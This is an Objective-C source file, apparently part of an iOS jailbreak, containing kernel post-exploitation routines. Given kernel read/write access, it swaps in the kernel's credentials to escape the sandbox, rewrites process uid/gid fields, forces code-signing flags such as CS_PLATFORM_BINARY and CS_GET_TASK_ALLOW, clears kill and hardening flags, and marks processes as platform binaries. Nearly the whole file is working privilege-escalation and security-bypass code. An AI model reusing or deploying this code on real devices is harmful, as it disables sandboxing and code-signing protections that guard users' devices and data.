#import "util.h"
#import "../csblob.h"
#import "krw.h"
#import "offsets.h"
#import "proc.h"
#import <libproc.h>
#import <libproc_private.h>
#import <sys/mount.h>

#define P_SUGID 0x00000100

uint64_t proc_get_ucred(uint64_t proc_ptr) {
  return kread64(proc_ptr + off_p_ucred);
}

void proc_set_ucred(uint64_t proc_ptr, uint64_t ucred_ptr) {
  kwrite64(proc_ptr + off_p_ucred, ucred_ptr);
}

void run_unsandboxed(void (^block)(void)) {
  uint64_t selfProc = proc_of_pid(getpid()); // self_proc();
  uint64_t selfUcred = proc_get_ucred(selfProc);

  uint64_t kernelProc = proc_of_pid(0);
  uint64_t kernelUcred = proc_get_ucred(kernelProc);

  proc_set_ucred(selfProc, kernelUcred);
  block();
  proc_set_ucred(selfProc, selfUcred);
}

NSString *proc_get_path(pid_t pid) {
  char pathbuf[4 * MAXPATHLEN];
  int ret = proc_pidpath(pid, pathbuf, sizeof(pathbuf));
  if (ret <= 0)
    return nil;
  return [[[NSString stringWithUTF8String:pathbuf]
      stringByResolvingSymlinksInPath] stringByStandardizingPath];
}

void proc_set_svuid(uint64_t proc_ptr, uid_t svuid) {
  kwrite32(proc_ptr + off_p_svuid, svuid);
}

void ucred_set_svuid(uint64_t ucred_ptr, uint32_t svuid) {
  kwrite32(ucred_ptr + off_u_cr_svuid, svuid);
}

void ucred_set_uid(uint64_t ucred_ptr, uint32_t uid) {
  kwrite32(ucred_ptr + off_u_cr_uid, uid);
}

void proc_set_svgid(uint64_t proc_ptr, uid_t svgid) {
  kwrite32(proc_ptr + off_p_svgid, svgid);
}

void ucred_set_svgid(uint64_t ucred_ptr, uint32_t svgid) {
  kwrite32(ucred_ptr + off_u_cr_svgid, svgid);
}

void ucred_set_cr_groups(uint64_t ucred_ptr, uint32_t cr_groups) {
  kwrite32(ucred_ptr + off_u_cr_groups, cr_groups);
}

uint32_t proc_get_p_flag(uint64_t proc_ptr) {
  return kread32(proc_ptr + off_p_flag);
}

void proc_set_p_flag(uint64_t proc_ptr, uint32_t p_flag) {
  kwrite32(proc_ptr + off_p_flag, p_flag);
}

int64_t proc_fix_setuid(pid_t pid) {
  NSString *procPath = proc_get_path(pid);
  struct stat sb;
  if (stat(procPath.fileSystemRepresentation, &sb) == 0) {
    if (S_ISREG(sb.st_mode) && (sb.st_mode & (S_ISUID | S_ISGID))) {
      uint64_t proc = proc_of_pid(pid);
      uint64_t ucred = proc_get_ucred(proc);
      if ((sb.st_mode & (S_ISUID))) {
        proc_set_svuid(proc, sb.st_uid);
        ucred_set_svuid(ucred, sb.st_uid);
        ucred_set_uid(ucred, sb.st_uid);
      }
      if ((sb.st_mode & (S_ISGID))) {
        proc_set_svgid(proc, sb.st_gid);
        ucred_set_svgid(ucred, sb.st_gid);
        ucred_set_cr_groups(ucred, sb.st_gid);
      }
      uint32_t p_flag = proc_get_p_flag(proc);
      if ((p_flag & P_SUGID) != 0) {
        p_flag &= ~P_SUGID;
        proc_set_p_flag(proc, p_flag);
      }
      return 0;
    } else {
      return 10;
    }
  } else {
    return 5;
  }
}

void pmap_set_wx_allowed(uint64_t pmap_ptr, bool wx_allowed) {
  uint64_t kernel_el = 8; // bootInfo_getUInt64(@"kernel_el");
  uint32_t el2_adjust = (kernel_el == 8) ? 8 : 0;
  kwrite8(pmap_ptr + 0xC2 + el2_adjust, wx_allowed);
}

uint32_t proc_get_csflags(uint64_t proc) {
  return kread32(proc + off_p_csflags);
}

void proc_set_csflags(uint64_t proc, uint32_t csflags) {
  kwrite32(proc + off_p_csflags, csflags);
}

void task_set_memory_ownership_transfer(uint64_t task_ptr, uint8_t enabled) {
  kwrite8(task_ptr + 0x5B0, enabled);
}

vm_map_flags vm_map_get_flags(uint64_t vm_map_ptr) {
  uint32_t flags_offset = 0x11C;
  vm_map_flags flags;
  kreadbuf(vm_map_ptr + flags_offset, &flags, sizeof(flags));
  return flags;
}

void vm_map_set_flags(uint64_t vm_map_ptr, vm_map_flags new_flags) {
  uint32_t flags_offset = 0x11C;
  kwritebuf(vm_map_ptr + flags_offset, &new_flags, sizeof(new_flags));
}

int proc_set_debugged(uint64_t proc_ptr, bool fully_debugged) {
  uint64_t task = proc_get_task(proc_ptr);
  uint64_t vm_map = task_get_vm_map(task);
  uint64_t pmap = vm_map_get_pmap(vm_map);

  // For most unrestrictions, just setting wx_allowed is enough
  // This enabled hooks without being detectable at all, as cs_ops will not
  // return CS_DEBUGGED
  pmap_set_wx_allowed(pmap, true);

  if (fully_debugged) {
    // When coming from ptrace, we want to fully emulate cs_allow_invalid though

    uint32_t flags = proc_get_csflags(proc_ptr) & ~(CS_KILL | CS_HARD);
    if (flags & CS_VALID) {
      flags |= CS_DEBUGGED;
    }
    proc_set_csflags(proc_ptr, flags);

    task_set_memory_ownership_transfer(task, true);

    vm_map_flags map_flags = vm_map_get_flags(vm_map);
    map_flags.switch_protect = false;
    map_flags.cs_debugged = true;
    vm_map_set_flags(vm_map, map_flags);
  }
  return 0;
}

int proc_set_debugged_pid(pid_t pid, bool fully_debugged) {
  int retval = 0;
  if (pid > 0) {
    // retval = proc_set_debugged(proc, fully_debugged);  //XXX panic
    // platformize(pid);
    set_proc_csflags(pid);
  }
  return retval;
}

#define TF_PLATFORM (0x00000400)

bool set_task_platform(pid_t pid, bool set) {
  uint64_t proc = proc_of_pid(pid);
  uint64_t task = kread64(proc + off_p_task);
  uint32_t t_flags = kread32(task + off_task_t_flags);

  if (set) {
    t_flags |= TF_PLATFORM;
  } else {
    t_flags &= ~(TF_PLATFORM);
  }

  kwrite32(task + off_task_t_flags, t_flags);

  return true;
}

void set_proc_csflags(pid_t pid) {
  uint64_t proc = proc_of_pid(pid);
  if (proc == -1)
    return;
  uint32_t csflags = kread32(proc + off_p_csflags);
  csflags = csflags | CS_DEBUGGED | CS_PLATFORM_BINARY | CS_INSTALLER |
            CS_GET_TASK_ALLOW;
  csflags &= ~(CS_RESTRICT | CS_HARD | CS_KILL);
  kwrite32(proc + off_p_csflags, csflags);
}

uint64_t get_cs_blob(pid_t pid) {
  uint64_t proc = proc_of_pid(pid);
  uint64_t textvp = kread64(proc + off_p_textvp);
  uint64_t ubcinfo = kread64(textvp + off_vnode_vu_ubcinfo);
  return kread64(ubcinfo + off_ubc_info_cs_blobs);
}

void set_csb_platform_binary(pid_t pid) {
  uint64_t cs_blob = get_cs_blob(pid);
  kwrite32(cs_blob + off_cs_blob_csb_platform_binary, 1);
}

void platformize(pid_t pid) {
  set_task_platform(pid, true);
  set_proc_csflags(pid);
  set_csb_platform_binary(pid);
}
